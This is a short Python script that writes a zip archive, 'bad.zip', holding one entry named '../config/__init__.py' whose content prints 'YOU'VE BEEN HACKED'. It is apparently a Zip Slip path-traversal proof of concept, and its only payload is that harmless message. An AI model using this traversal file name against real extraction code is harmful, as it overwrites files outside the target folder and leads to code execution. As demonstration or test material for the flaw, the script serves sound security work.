import zipfile


def zip_up():
    z_info = zipfile.ZipInfo(r"../config/__init__.py")
    z_file = zipfile.ZipFile("bad.zip", mode="w")
    z_file.writestr(z_info, "print(\"YOU'VE BEEN HACKED\")")
    z_file.close()


zip_up()
